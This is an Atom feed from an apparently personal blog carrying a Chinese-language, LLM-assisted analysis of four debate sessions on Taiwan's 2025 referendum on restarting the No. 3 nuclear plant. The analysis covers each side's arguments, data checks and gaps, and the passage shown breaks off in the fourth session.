<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>烏鴉囈語</title>
  
  <subtitle>無病呻吟之地</subtitle>
  <link href="http://withoutdirection.github.io/atom.xml" rel="self"/>
  
  <link href="http://withoutdirection.github.io/"/>
  <updated>2025-08-22T10:18:54.319Z</updated>
  <id>http://withoutdirection.github.io/</id>
  
  <author>
    <name>烏鴉先生</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>核能發電廠重啟公投意見發表會分析</title>
    <link href="http://withoutdirection.github.io/Referendum-21-Press-conference/"/>
    <id>http://withoutdirection.github.io/Referendum-21-Press-conference/</id>
    <published>2025-08-11T16:00:00.000Z</published>
    <updated>2025-08-22T10:18:54.319Z</updated>
    
    <content type="html"><![CDATA[<h1 id="核能發電廠重啟公投意見發表會分析"><a href="#核能發電廠重啟公投意見發表會分析" class="headerlink" title="核能發電廠重啟公投意見發表會分析"></a>核能發電廠重啟公投意見發表會分析</h1><h2 id="分析方法"><a href="#分析方法" class="headerlink" title="分析方法"></a>分析方法</h2><p>本分析分為兩階段</p><ul><li>首先透過:</li></ul><ol><li>以<a href="https://huggingface.co/ggerganov/whisper.cpp/tree/90a64d80ea254cf67575b41a5971f972c79f7b45">ggml-medium 模型</a> 結合 <a href="https://github.com/ggml-org/whisper.cpp">whisper</a> 將發表會之直播語音檔轉為中文逐字稿</li><li>以Grok3透過”逐字稿”進行文本分析，提取關鍵論點與數據</li><li>最後將所有分析結果以 Claude 4進行整合與表格化</li></ol><ul><li>再來根據LLM分析內容</li></ul><ol><li>找尋其中提到論點或是證據薄弱的地方，標註資料、引用的方法與來源</li><li>若是可行的話，會嘗試找出相關的背景知識或是數據，並且進行<a href="#%E6%AA%A2%E8%A6%96%E9%97%95%E6%BC%8F%E8%88%87%E6%95%B8%E6%93%9A">驗證、視覺化</a></li></ol><blockquote><p>為公正性，以下為用grok作分析所使用的prompt，歡迎大家用同樣的步驟檢驗內容<br>Prompt(Grok3):<br>附件為一針對核能發電廠是否要重啟之辯論會，<br>請根據裡面的內容結合邏輯敘述背景知識與核能發電背景知識分析雙方論點，<br>並指出雙方有無數據錯誤、缺漏。<br>將分析結果以中文的markdown文件產出</p></blockquote><blockquote><p>Prompt(Claude 4)(Style: Formal):<br>請將以下內容進行整合與表格化，並標註是由哪一個人所發表或是為分析之補充:<br>(貼上內容)</p></blockquote><hr><h2 id="第一場發表會"><a href="#第一場發表會" class="headerlink" title="第一場發表會"></a>第一場發表會</h2><blockquote><p>此處Whisper誤將葉宗洸教授解析成葉宗光教授，為展現對教授之敬意，將其更正為葉宗洸</p></blockquote><h3 id="正方（葉宗洸）論點分析"><a href="#正方（葉宗洸）論點分析" class="headerlink" title="正方（葉宗洸）論點分析"></a>正方（葉宗洸）論點分析</h3><h4 id="主要論點"><a href="#主要論點" class="headerlink" title="主要論點"></a>主要論點</h4><ol><li><p><strong>能源安全與獨立電網</strong>：</p><ul><li>台灣是資源匱乏的島國，98%的能源依賴進口，獨立電網使能源安全至關重要。</li><li>核能發電的燃料安全存量為18至36個月，遠高於燃煤（36天）和天然氣（7至11天），有利於能源穩定。</li><li>國際友人（如美國駐台代表、美國海軍情報官）建議台灣保留核電，認為至少一座核電廠可提供5%至6%的電力，確保軍事、行政、醫療等基本用電需求。</li></ul></li><li><p><strong>核電安全性</strong>：</p><ul><li>台灣核電廠運轉40年未因地震發生重大事故，全球也無核電廠因地震造成致命損壞。</li><li>核三廠耐震能力達0.72G，高於台北101（0.3G）和翡翠水庫（0.4G），即使按美國核管會SHAKE LEVEL 3標準（1.384G），仍可安全停機。</li><li>核三廠位於海平面15公尺以上，另有19公尺高的海嘯防護牆，足以抵禦最高10公尺的海嘯。</li></ul></li><li><p><strong>核電廠壽命</strong>：</p><ul><li>核電廠40年壽命限制源於美國反托拉斯政策，而非技術限制。美國80多座核電廠經更新後繼續運轉，無40年強制除役規定。</li><li>密西根Parsadis核電廠已進入除役階段，但成功申請重啟，顯示除役核電廠重啟可行。</li></ul></li><li><p><strong>供電緊迫與政策失誤</strong>：</p><ul><li>台灣目前供電緊張，出現「中電南送」現象，顯示能源政策失衡。</li><li>新建機組（如大潭九號機、新達電廠）進度落後，燃煤機組被迫違法重啟，顯示台電供電壓力。</li><li>核電成本低（每度1.5元），相較天然氣與再生能源（風電6.5元、光電4.8元）更具經濟效益。</li></ul></li></ol><h4 id="數據與邏輯檢視"><a href="#數據與邏輯檢視" class="headerlink" title="數據與邏輯檢視"></a>數據與邏輯檢視</h4><ul><li><p><strong>正確性</strong>：</p><ul><li><strong>能源進口比例</strong>：台灣確實高度依賴能源進口，根據能源署數據，2024年能源進口比例約97.5%，與正方所述98%相符。</li><li><strong>燃料存量</strong>：核燃料存量（18至36個月）與燃煤（約30天）、天然氣（7至11天）數據大致正確，反映核能燃料高能量密度與長期儲存特性。</li><li><strong>耐震能力</strong>：核三廠耐震設計為0.72G，台北101為0.3G，翡翠水庫為0.4G，數據合理。美國核管會SHAKE LEVEL 3標準（1.384G）測試結果顯示核三廠可安全停機，符合台電公開報告。</li><li><strong>Parsadis核電廠案例</strong>：美國密西根州的Palisades核電廠確於2025年獲准重啟，為全球首個進入除役後重啟的案例，正方引用正確。</li><li><strong>核電成本</strong>：核電發電成本約每度1.5至2元，遠低於風電（約6元）與光電（約4.5元），數據合理。</li></ul></li><li><p><strong>缺漏與邏輯漏洞</strong>：</p><ul><li><strong>國際建議的背景</strong>：正方引用美國駐台代表與海軍情報官的建議，但未提供具體出處或背景，可能誇大其權威性，且未說明這些建議是否基於台灣實際情況。</li><li><strong>核電廠攻擊風險</strong>：正方稱核電廠因全球影響而不會成為戰爭攻擊目標，但未提供充分證據。烏克蘭戰爭中，核電廠雖未被直接攻擊，但曾受威脅（如扎波羅熱核電廠），顯示風險存在。</li><li><strong>福島事故簡化</strong>：正方將福島事故完全歸因於海嘯，忽略地震對冷卻系統的間接影響及人為管理失誤，可能過分簡化事故原因。</li><li><strong>經濟效益過分強調</strong>：正方強調核電低成本，但未充分討論核廢料處理與除役成本，這些長期成本可能抵消短期經濟優勢。</li><li><strong>供電緊張證據不足</strong>：正方提及「中電南送」與燃煤機組違法重啟，但未提供具體數據（如違法重啟的發電量或頻率），可能誇大問題嚴重性。</li></ul></li></ul><hr><h3 id="反方（曾文生）論點分析"><a href="#反方（曾文生）論點分析" class="headerlink" title="反方（曾文生）論點分析"></a>反方（曾文生）論點分析</h3><h4 id="主要論點-1"><a href="#主要論點-1" class="headerlink" title="主要論點"></a>主要論點</h4><ol><li><p><strong>程序正義與科學檢驗</strong>：</p><ul><li>核電廠延役需經過嚴謹的科學檢驗與公開透明程序，現階段未完成安全評估，公投時機不成熟。</li><li>主管機關需確認「無安全疑慮」，但這需繁複的設備老化評估、風險因子分析及工程補強，無法僅憑投票決定。</li><li>台電需依據核安會的審查程序進行自我安全檢查，公開風險評估結果後再徵求民意。</li></ul></li><li><p><strong>供電穩定性</strong>：</p><ul><li>台灣供電穩定，備轉容量率低於6%的天數從2016-2017年的100天降至近年幾乎為零（日間）或少於10天（夜間）。</li><li>新建天然氣機組（如大潭、通宵、新達電廠）已提升北部供電能力，短期「中電南送」現象將隨新達電廠機組上線消失。</li><li>核三廠除役後，台電可透過其他機組調度滿足需求，6%發電量損失可控。</li></ul></li><li><p><strong>環境與核廢料問題</strong>：</p><ul><li>台電火力發電空污排放自2016年起減少70%，反駁核電除役導致空污惡化的說法。</li><li>核廢料處置是延役核電的關鍵問題，台電正積極推動高階核廢料選址立法，需負責任地尋求解決方案。</li></ul></li><li><p><strong>政策與民意</strong>：</p><ul><li>非核家園為長期政策，核能延役需滿足安全、核廢料解方及民意支持三前提。</li><li>立法院2025年修法開放核電廠執照延期申請，台電將依法進行安全審查，顯示政府並非完全反對核電。</li></ul></li></ol><h4 id="數據與邏輯檢視-1"><a href="#數據與邏輯檢視-1" class="headerlink" title="數據與邏輯檢視"></a>數據與邏輯檢視</h4><ul><li><p><strong>正確性</strong>：</p><ul><li><strong>備轉容量率</strong>：反方稱2016-2017年備轉容量率低於6%的天數達100天，近年幾乎為零（日間）或少於10天（夜間），與台電公開數據一致，顯示供電穩定性提升。</li><li><strong>空污排放</strong>：台電火力發電空污排放減少70%的說法與環保署監測數據相符，反映燃煤機組升級與天然氣機組增加的成效。</li><li><strong>核廢料選址</strong>：台電確實推動高階核廢料選址立法，顯示對核廢料問題的積極態度。</li><li><strong>立法院修法</strong>：2025年5月修訂核管法，開放執照延期申請，反方所述正確。</li></ul></li><li><p><strong>缺漏與邏輯漏洞</strong>：</p><ul><li><strong>安全審查細節不足</strong>：反方強調需嚴謹程序，但未具體說明核三廠延役所需的檢查項目、時間表或成本，降低說服力。</li><li><strong>供電穩定性證據單薄</strong>：反方雖稱備轉容量率改善，但未回應正方提及的新建機組進度落後問題，可能掩蓋短期供電風險。</li><li><strong>核廢料問題未深入</strong>：反方提及核廢料選址立法，但未提供當前進度或可行方案，無法完全回應正方的質疑。</li><li><strong>程序正義過分強調</strong>：反方質疑公投時機，但未正面回應正方「政府不積極評估核電延役」的批評，可能顯得迴避核心問題。</li><li><strong>燃煤機組備用爭議</strong>：反方稱燃煤機組作為國安備用，但未解釋為何違法重啟（如新達三、四號機），可能削弱論述可信度。</li></ul></li></ul><hr><h3 id="雙方比較與總結"><a href="#雙方比較與總結" class="headerlink" title="雙方比較與總結"></a>雙方比較與總結</h3><h4 id="數據正確性"><a href="#數據正確性" class="headerlink" title="數據正確性"></a>數據正確性</h4><ul><li><strong>正方</strong>：能源進口比例、燃料存量、耐震能力、核電成本及Palisades案例等數據正確，但國際建議與核電廠攻擊風險的論述缺乏充分證據。</li><li><strong>反方</strong>：備轉容量率、空污排放減少及立法院修法等數據正確，但安全審查與核廢料處置的具體進展資訊不足。</li></ul><h4 id="邏輯缺漏"><a href="#邏輯缺漏" class="headerlink" title="邏輯缺漏"></a>邏輯缺漏</h4><ul><li><strong>正方</strong>：<ul><li>過分強調核電的經濟與安全優勢，忽略核廢料處理與除役成本的長期影響。</li><li>福島事故與核電廠戰爭風險的論述過於簡化，未能全面評估複雜風險。</li><li>「中電南送」與違法重啟的指控雖具衝擊力，但缺乏具體數據支持。 <code>此處應該是反方的缺漏</code></li></ul></li><li><strong>反方</strong>：<ul><li>強調程序正義與安全審查，但未提供具體方案或時間表，顯得論述空泛。</li><li>未充分回應正方對新建機組進度落後的質疑，可能掩蓋供電挑戰。</li><li>核廢料問題的討論停留於立法層面，缺乏實際解決方案的細節。</li></ul></li></ul><h4 id="背景知識補充"><a href="#背景知識補充" class="headerlink" title="背景知識補充"></a>背景知識補充</h4><ul><li><strong>核能發電特性</strong>：核能發電具低碳、高穩定性與低燃料成本優勢，但核廢料處置與電廠除役成本高，且需嚴格安全管理。全球核電廠延役趨勢增加（如美國、加拿大），但需通過嚴格的設備老化評估與更新。</li><li><strong>台灣能源現況</strong>：2024年台灣電力結構中，燃煤佔約30%，天然氣佔45%，核能僅剩3%（核三廠除役前）。再生能源（風電、光電）佔比約10%，但間歇性問題需搭配穩定電源。</li><li><strong>核廢料挑戰</strong>：台灣高階核廢料目前儲存於核電廠內，長期處置場尚未確定，選址需考慮地質穩定性與社會接受度，技術與政治難度高。</li></ul><hr><h2 id="第二場發表會"><a href="#第二場發表會" class="headerlink" title="第二場發表會"></a>第二場發表會</h2><h3 id="辯論背景簡述"><a href="#辯論背景簡述" class="headerlink" title="辯論背景簡述"></a>辯論背景簡述</h3><blockquote><p>此處Whisper誤將林子倫教授解析成林子綸教授，為展現對教授之敬意，將其更正為林子倫</p></blockquote><p>此辯論會為2025年8月23日台灣全國性公民投票第21案（是否同意核三廠經確認無安全疑慮後繼續運轉）的第二場意見發表會，由中央選舉委員會主辦。正方代表翁曉玲（立法委員，支持重啟）主張核電為能源安全、低碳且經濟的必要選項；反方代表林子倫（台灣大學教授，反對重啟）強調再生能源轉型、核電風險與全球趨勢。辯論焦點涵蓋能源安全、空氣污染、健康影響、經濟成本及國際趨勢。</p><p>台灣核能背景：台灣有三座核電廠（核一、核二、核三），核三廠位於屏東恆春，為最新一座。依民進黨「非核家園」政策，核三廠二號機於2025年5月17日執照到期停止運轉，目前台灣電力結構以火力發電為主（約83%），再生能源約12%，能源97%依賴進口。全球核能佔比約9-10%，再生能源（含水力）約30-32%，IEA預測2050年再生能源在淨零情景下佔比達90%。</p><p>以下分析雙方論點，結合邏輯、背景知識，並指出數據錯誤或缺漏。分析基於辯論內容及外部驗證（如IEA報告、台灣能源局數據、耶魯EPI指數）。</p><h3 id="正方論點分析"><a href="#正方論點分析" class="headerlink" title="正方論點分析"></a>正方論點分析</h3><p>正方強調核電為台灣能源困境的解方，論點邏輯上以「能源安全 vs. 缺電風險」、「健康與環保 vs. 火力污染」、「經濟效益 vs. 再生能源高成本」為主軸，呼籲務實回歸核電。背景知識支持核電低碳（發電過程無CO2排放）、穩定（基載電力不受天候影響），並被歐盟部分國家視為綠能。但論點忽略核電潛在風險（如地震帶位置），並過度簡化再生能源局限。</p><h4 id="主要論點-2"><a href="#主要論點-2" class="headerlink" title="主要論點"></a>主要論點</h4><ol><li><p><strong>能源結構與缺電風險</strong>：</p><ul><li>台灣已進入非核家園，核三廠2025年5月17日停止，晚間95%電力來自火力（煤、天然氣）。</li><li>全球僅德國、台灣廢核，但台灣無德國條件（再生能源50-60%、鄰國購電）。</li><li>蔡英文執政8年有4-5次全國大停電，區域停電頻繁；能源93-96%進口，封鎖風險高。</li><li>邏輯分析：強調火力依賴導致不穩定，核電佔6%但為「救命電」。背景知識：台灣島國、多山，進口依賴高（97%），地緣風險（如台海衝突）確實存在。</li></ul></li><li><p><strong>環保與健康益處</strong>：</p><ul><li>核電低碳、乾淨，優於火力（無「乾淨煤」）；火力造成空污，肺癌年增（10萬人得癌、1萬多人死，非吸菸者佔50%以上，女性90%）。</li><li>空污嚴重：耶魯2024排名台灣第163名；火力危害遠高於核電。</li><li>邏輯分析：以醫學數據連結空污與健康，批評民進黨「用肺發電」。背景知識：核電確為低碳能源，火力PM2.5排放高，台灣肺癌非吸菸者比例高（60%），但空污為多因。</li></ul></li><li><p><strong>經濟與穩定性</strong>：</p><ul><li>再生能源僅13%，目標20%跳票；電價漲4次，台電虧4000億。</li><li>核電便宜（燃料丸等於1噸煤），穩定不依天候；全球111座反應爐超40年、13座超50年。</li><li>核三安全：40年無重大事故，當地78%支持、全國67%支持；核廢料有技術解決。</li><li>邏輯分析：主張核+再生共存，批評綠能弊案、土地占用。背景知識：核電成本低於再生（但新廠高），延役可行（美國延至80年）。</li></ul></li></ol><h4 id="數據錯誤與缺漏"><a href="#數據錯誤與缺漏" class="headerlink" title="數據錯誤與缺漏"></a>數據錯誤與缺漏</h4><ul><li><strong>錯誤</strong>：<ul><li>火力95%：整體2024年火力83.2%（煤39.3%、氣42.4%），但晚間高峰可能接近95%（無太陽能）。非嚴重錯誤，但未區分整體 vs. 峰值。</li><li>肺癌數據：台灣2021年肺癌新診斷約1.6萬（非10萬），死亡約1萬。10萬可能為所有癌症總數誤用；非吸菸者佔60%（非50%），女性90%正確。</li><li>耶魯排名：2024 EPI空氣品質台灣排88（非163），總EPI排60。163可能是總排名倒數誤讀。</li><li>能源進口：93-96% vs. 實際97.73%，輕微低估。</li></ul></li><li><strong>缺漏</strong>：<ul><li>未提核三地震風險（台灣地震帶，專家警告耐震不足）。</li><li>核廢料：僅稱「有技術」，缺具體計畫（如蘭嶼爭議、長期儲存成本）。</li><li>忽略再生能源進展：台灣離岸風電全球第五，成長5倍。</li><li>未討論AI&#x2F;半導體高耗電需求，可能放大缺電風險。</li></ul></li></ul><h3 id="反方論點分析"><a href="#反方論點分析" class="headerlink" title="反方論點分析"></a>反方論點分析</h3><p>反方以「能源轉型框架」為核心，主張再生能源為主流趨勢，核電增加風險。論點邏輯強調「韌性 vs. 集中風險」、「全球共識 vs. 舊技術」，呼籲投資未來。背景知識支持再生能源快速成長（IEA：新增92%來自再生），但忽略其間歇性需儲能輔助，及台灣土地限制。</p><h4 id="主要論點-3"><a href="#主要論點-3" class="headerlink" title="主要論點"></a>主要論點</h4><ol><li><p><strong>能源安全與轉型</strong>：</p><ul><li>非核100天，需社會共識；能源安全需多元、分散、在地再生能源（太陽、風、地熱等）。</li><li>集中核電脆弱（災害、地緣風險）；再生結合智慧電網，提升韌性。</li><li>邏輯分析：典範轉移，從集中到分散。背景知識：台灣地震&#x2F;颱風多，分散再生可減風險。</li></ul></li><li><p><strong>全球趨勢與數據</strong>：</p><ul><li>再生新增92.5%，全球佔32%（核9%）；IEA預測2026再生超越核，2050再生90%、核10%。</li><li>COP28目標再生三倍；台灣產業需綠電（台積電等）。</li><li>邏輯分析：引用聯合國&#x2F;IEA報告，強調機會成本。背景知識：IEA NZE情景確實再生主導，核維持10%。</li></ul></li><li><p><strong>核電風險與成本</strong>：</p><ul><li>安全不確定：地震帶、攻擊風險；成本超支（福島賠償10兆日圓）、廢料債留子孫。</li><li>台灣轉型成果：再生成長5倍，佔12%；台中PM2.5從2018年20.9降至2024年15；溫室氣體從2007峰值降，佔全球0.5%。</li><li>邏輯分析：比喻「40年老車」，強調道德風險（Leave屏東人behind）。背景知識：核災成本高，廢料無終處置。</li></ul></li></ol><h4 id="數據錯誤與缺漏-1"><a href="#數據錯誤與缺漏-1" class="headerlink" title="數據錯誤與缺漏"></a>數據錯誤與缺漏</h4><ul><li><strong>錯誤</strong>：<ul><li>再生佔32%：正確（含水力），但核9%準確。</li><li>台中PM2.5：2018年20.9 → 2024年15正確（環保局數據），但整體台灣2022年13.4、2023可能回升（沙塵影響），改善趨勢成立。</li><li>溫室氣體：從2007峰值降正確，但台灣排放仍高（全球0.5%），減碳需加速。</li></ul></li><li><strong>缺漏</strong>：<ul><li>未提再生能源間歇性：需大量儲能&#x2F;備載，台灣目前儲能不足，可能導致缺電。</li><li>成本忽略：再生初始高（但下降中），土地占用（農田光電爭議）。</li><li>忽略民意：2025年民調66-67%支持核三重啟，未回應社會分歧。</li><li>未討論核延役可行性：全球多例超40年，核三硬體健全。</li><li>綠能商機：強調就業，但缺量化數據（如綠領人才增幅）。</li></ul></li></ul><hr><h2 id="第三場發表會"><a href="#第三場發表會" class="headerlink" title="第三場發表會"></a>第三場發表會</h2><h3 id="背景介紹"><a href="#背景介紹" class="headerlink" title="背景介紹"></a>背景介紹</h3><blockquote><p>此處Whisper誤將黃士修解析成黃世修，為展現敬意，將其更正為黃士修</p></blockquote><p>本辯論會為台灣中央選舉委員會針對2025年全國性公民投票第21案所舉辦的第三場意見發表會，主題為「您是否同意第三核能發電廠經主管機關同意確認無安全疑慮後繼續運轉」。辯論日期為2025年8月左右（辯論中提及公投日期為8月23日），正方代表黃士修（支持重啟，強調以核養綠）與反方代表甘崇偉（反對重啟，台灣綠黨共同召集人）各發表兩輪意見，每輪12分鐘。</p><p>核三廠（馬鞍山核電廠）位於屏東縣恆春鎮，為台灣第三座核電廠，使用第二代壓水式反應爐，於1978年動工、1984年商轉，已於2025年5月17日除役。台灣能源背景：非核家園政策自2016年民進黨執政後推動，但2018年「以核養綠」公投通過，否定該政策；2025年台灣電力供應依賴火力（煤、天然氣）約80%，再生能源約10%，核能歸零後面臨缺電疑慮與碳排壓力。全球核能背景：核能提供穩定基載電力，但面臨安全、廢料與地震風險；福島核災（2011）後，全球核電趨勢分歧，歐盟將核能納入綠色分類但有嚴格條件。</p><p>分析基於辯論內容，結合邏輯（論點一致性）、核能背景知識（安全設計、廢料處理、地震耐受）與外部事實驗證（來自WHO、UNSCEAR、台電、歐盟稅則等來源）。重點指出雙方論點強弱、數據錯誤或缺漏。</p><h3 id="正方論點分析（黃士修，支持重啟）"><a href="#正方論點分析（黃士修，支持重啟）" class="headerlink" title="正方論點分析（黃士修，支持重啟）"></a>正方論點分析（黃士修，支持重啟）</h3><p>黃士修的論點以經濟、安全與地緣政治為主軸，強調重啟核三可改善台灣能源結構，批評反核政策導致台電虧損與空污增加。論點邏輯上強調機會成本（廢核的隱藏損失），並用國際事實反駁反核恐懼。</p><h4 id="主要論點："><a href="#主要論點：" class="headerlink" title="主要論點："></a>主要論點：</h4><ul><li><strong>經濟優勢</strong>：核能成本低（1.5元&#x2F;度，包含廢料處理），再生能源5.5元&#x2F;度；核三重啟可發150億度電&#x2F;年，省600億元；全核運轉可省2400億元，等於普發1萬元&#x2F;人。重啟可取代中火（台中火力發電廠）272億度煤電，關閉10部機組，減空污（台灣2024人均煤電世界第一）。</li><li><strong>安全與事實澄清</strong>：福島輻射無死亡或癌症增加（WHO&#x2F;UNSCEAR報告）。核三耐震已加固到1.384G（7級地震僅0.4G）。核電廠不怕地震（如日本女川核廠成避難所）。事故少，核三未重大事故。</li><li><strong>核廢處理</strong>：有解，美國2000年表態可幫台灣處理；歐盟認核為綠能（納入永續投資）。</li><li><strong>政策與地緣</strong>：反核導致台電虧損4500億元；非核家園違2018公投。反核是反美（美國支持台灣核能）、賣台（易受中國封鎖，天然氣撐不過10天）。重啟符合能源安全與SDGs。</li><li><strong>批評反方</strong>：反核團體散佈謠言，拒認核為綠能；恆春斷層非第一類活動斷層，個人主張未經專家評估。</li></ul><h4 id="強點："><a href="#強點：" class="headerlink" title="強點："></a>強點：</h4><ul><li>經濟邏輯強：機會成本計算合理，核能確實為低成本基載電源（全球平均核電成本約1-2元&#x2F;度，再生能源依技術變動5-10元&#x2F;度）。</li><li>福島事實正確：UNSCEAR&#x2F;WHO確認無輻射相關死亡，主要是疏散壓力導致健康問題。</li><li>台灣煤電人均最高：2024數據約5115 kWh&#x2F;人，世界第一，證明廢核後煤依賴增加。</li></ul><h4 id="數據錯誤或缺漏："><a href="#數據錯誤或缺漏：" class="headerlink" title="數據錯誤或缺漏："></a>數據錯誤或缺漏：</h4><ul><li><strong>耐震值錯誤</strong>：宣稱核三加固到1.384G，但台電報告顯示原設計0.4G，加固安全停機系統到0.72G；1.384G為重新地震危害分析的峰值加速度（可能地震強度），非耐震能力。缺漏：未提恆春斷層確為活動斷層（3300年前活動，廠區下方簡列帶），風險存在。</li><li><strong>核廢處理過度樂觀</strong>：美國曾表態（2000年），但無正式協議；台灣無高階廢料最終處置廠（計劃2055年），蘭嶼僅暫存。缺漏：未提歐盟條件（2050前高階處置廠、ATF燃料），核三不符。</li><li><strong>重啟時間缺漏</strong>：批評核三停機3個月重啟時間，但實際需安檢、環評、地方同意，至少2-5年（類似美國Palisades重啟2年）。</li><li><strong>其他缺漏</strong>：未提核三事故歷史（如2001 SBO為INES 3嚴重事件）；忽略老舊風險（浴缸曲線：40年後故障率升）。</li></ul><h3 id="反方論點分析（甘崇偉，反對重啟）"><a href="#反方論點分析（甘崇偉，反對重啟）" class="headerlink" title="反方論點分析（甘崇偉，反對重啟）"></a>反方論點分析（甘崇偉，反對重啟）</h3><p>甘崇偉以工程師視角，強調風險評估與數據，主張不缺電、無需冒險重啟老舊核廠。論點邏輯聚焦「需求確認」與「系統風險」，用歷史事故與地質科學支持。</p><h4 id="主要論點：-1"><a href="#主要論點：-1" class="headerlink" title="主要論點："></a>主要論點：</h4><ul><li><strong>不缺電</strong>：自2025&#x2F;5&#x2F;17核三除役至今，備轉容量97% &gt;10%，最低6.2%；節電計劃2027省206億度 &gt;核三178億度&#x2F;年。未來再生能源+燃氣取代煤。</li><li><strong>安全風險</strong>：核三老舊（40年，第二代），事故頻發（1985氫氣火災、1993輻射廢水、2001 SBO全黑2小時、2013變壓器警報84天、2025火災）。浴缸曲線：老化故障率升。</li><li><strong>地質風險</strong>：恆春斷層活動（3300年前），廠區下方簡列帶（地震可撕裂廠房）；耐震僅0.72G，撐不住1.384G峰值。類似2018花蓮地震損毀建築。</li><li><strong>核廢與綠能</strong>：無最終處置廠（蘭嶼滿載）；不符歐盟條件（2050高階處置、ATF燃料）。全球趨勢：2004-2023非中國，啟用53、關閉104；再生投資10倍核能。</li><li><strong>成本與戰時</strong>：重啟成本高（如加州魔鬼谷延役5年2500-3900億台幣）；需5年流程。戰時核廠易攻擊（烏克蘭札波羅熱例），再生能源更韌性。</li><li><strong>環保立場</strong>：支持綠能但反毀林貪污；核三選址錯誤，應遠離斷層。</li></ul><h4 id="強點：-1"><a href="#強點：-1" class="headerlink" title="強點："></a>強點：</h4><ul><li>事故歷史正確：2001 SBO為INES 3，確認多起事件（台電公開資料）。</li><li>斷層風險科學：恆春斷層確活動，廠區地質脆弱（台電槽溝資料）。</li><li>歐盟條件正確：核需高階處置2050前運轉、ATF等；台灣不符。</li><li>全球趨勢數據大致正確：非中國啟用少於關閉（WNISR報告：全球關閉多，中國主導新啟用）。</li><li>備轉容量：短期數據合理（2025除役後維持6%以上），但邏輯上強調「確認需求」合理。</li></ul><h4 id="數據錯誤或缺漏：-1"><a href="#數據錯誤或缺漏：-1" class="headerlink" title="數據錯誤或缺漏："></a>數據錯誤或缺漏：</h4><ul><li><strong>備轉容量缺漏</strong>：短期數據正確，但忽略未來需求（AI工廠、2025預測夜間7%、最壞0.4%）；缺電風險存在（2021三次大停電）。</li><li><strong>重啟成本</strong>：魔鬼谷例合理，但核三是除役而非延役，成本可能較低（美國Palisades重啟約2000億台幣）；缺漏：重啟可省煤&#x2F;氣成本。</li><li><strong>戰時風險</strong>：核廠易癱瘓正確（烏克蘭例），但缺漏：核能提供穩定基載，封鎖下天然氣更脆弱（CSIS兵推：10天斷）。</li><li><strong>其他缺漏</strong>：未提核能減碳貢獻（台灣碳排因廢核增加）；全球核趨勢忽略中國（全球淨增加），投資差異因核資本密集。</li></ul><h3 id="雙方比較與整體評估"><a href="#雙方比較與整體評估" class="headerlink" title="雙方比較與整體評估"></a>雙方比較與整體評估</h3><ul><li><strong>邏輯一致性</strong>：正方強在經濟與地緣，強調機會成本與國際支持；反方強在安全風險，數據詳盡。但雙方皆有政治攻擊（正方稱反核「賣台」、反方避談未來缺電）。</li><li><strong>數據準確度</strong>：正方耐震值錯誤，反方趨勢數據正確但忽略中國貢獻。雙方缺漏對方優勢（如正方未提事故，反方未提煤依賴增加）。</li><li><strong>背景知識整合</strong>：核能安全設計（多重冷卻系統）支持正方，但台灣地震頻繁（環太平洋火環）放大反方斷層論。廢料處理全球有解（乾貯、地質掩埋），但台灣政治阻礙進展。</li><li><strong>潛在偏誤</strong>：正方忽略老舊風險，反方過度強調核災（福島無輻射死），忽略再生能源間歇性（需儲能）。</li></ul><hr><blockquote><p>此處Whisper誤將吳亞昕解析成吳亞新，為展現對敬意，將其更正為吳亞昕</p></blockquote><h2 id="第四場發表會-黃國昌-vs-吳亞昕"><a href="#第四場發表會-黃國昌-vs-吳亞昕" class="headerlink" title="第四場發表會(黃國昌 vs. 吳亞昕)"></a>第四場發表會(黃國昌 vs. 吳亞昕)</h2><h3 id="正方論點分析（黃國昌，支持重啟）"><a href="#正方論點分析（黃國昌，支持重啟）" class="headerlink" title="正方論點分析（黃國昌，支持重啟）"></a>正方論點分析（黃國昌，支持重啟）</h3><p>正方強調台灣能源政策失敗、國家安全需求及國際趨勢，主張重啟核三是務實選擇。論點分為能源失敗、環境&#x2F;經濟代價、國家安全、民調支持及核廢料解決方案。</p><h4 id="主要論點及邏輯分析"><a href="#主要論點及邏輯分析" class="headerlink" title="主要論點及邏輯分析"></a>主要論點及邏輯分析</h4><ol><li><p><strong>能源轉型失敗</strong>：</p><ul><li>主張：民進黨2016年「5-3-2」政策（再生能源20%、天然氣50%、煤30%）失敗，2026年再生能源仍未達20%；火力發電全開，違反減碳趨勢。</li><li>邏輯與背景：符合事實，台灣再生能源進展緩慢（2023年約9%），火力佔比高導致PM2.5污染與健康問題。核能作為低碳基載可補充再生能源間歇性，邏輯合理。但忽略再生能源潛力（如離岸風電擴張）。</li></ul></li><li><p><strong>經濟與環境代價</strong>：</p><ul><li>主張：台電虧損超4000億元，電價漲四次；綠能貪腐（如光電板破壞土地）；光電板成大型廢棄物（丹納斯颱風例）。</li><li>邏輯與背景：台電虧損屬實（2023年累虧約3823億元），綠能貪腐指控需證據，但台灣光電開發確有環境爭議（如農地轉用）。核能成本低（運轉期長），但忽略初始投資高與除役成本。</li></ul></li><li><p><strong>國家安全與能源韌性</strong>：</p><ul><li>主張：天然氣存量7-11天、煤1個月；國際友人（如朱棣文、博明、古立言）建議保留核電；核三關閉後供電不穩（如興達煤廠違法重啟、數據中心限電）。</li><li>邏輯與背景：台灣能源進口依賴高，地緣風險大（中國封鎖模擬中，CSIS報告建議核能）。AI產業需穩定電力，核三可提供3-5%電力。邏輯強，但忽略核電廠易成攻擊目標。</li></ul></li><li><p><strong>國際趨勢與民調</strong>：</p><ul><li>主張：美國、歐盟、日本重啟核能；民調顯示70%支持核三延役，年輕世代75%以上支持。</li><li>邏輯與背景：全球核能復興屬實（日本2040年核能20%、歐盟投資核能）。民調需驗證，但2024-2025年多項民調（如TVBS）顯示支持率約60-70%。強調科學務實，轉變自身反核立場合理。</li></ul></li><li><p><strong>核廢料與風險</strong>：</p><ul><li>主張：核廢料非新問題，DBD技術成熟（芬蘭、瑞士合作）；乾式儲存安全40年；政府怠惰未開會。</li><li>邏輯與背景：DBD為新興技術（鑽井至3-5km深），安全但尚未廣泛實證（芬蘭Onkalo為DGD）。台灣無最終處置場屬實，蘭嶼低階廢料爭議久。主張科技可控，忽略社會共識難。</li></ul></li></ol><p>總體邏輯：從失敗政策切入，強調務實轉型，結合國家安全與國際支持。強項在經濟&#x2F;安全數據，弱項在風險低估。</p><h3 id="反方論點分析（吳亞昕，反對重啟）"><a href="#反方論點分析（吳亞昕，反對重啟）" class="headerlink" 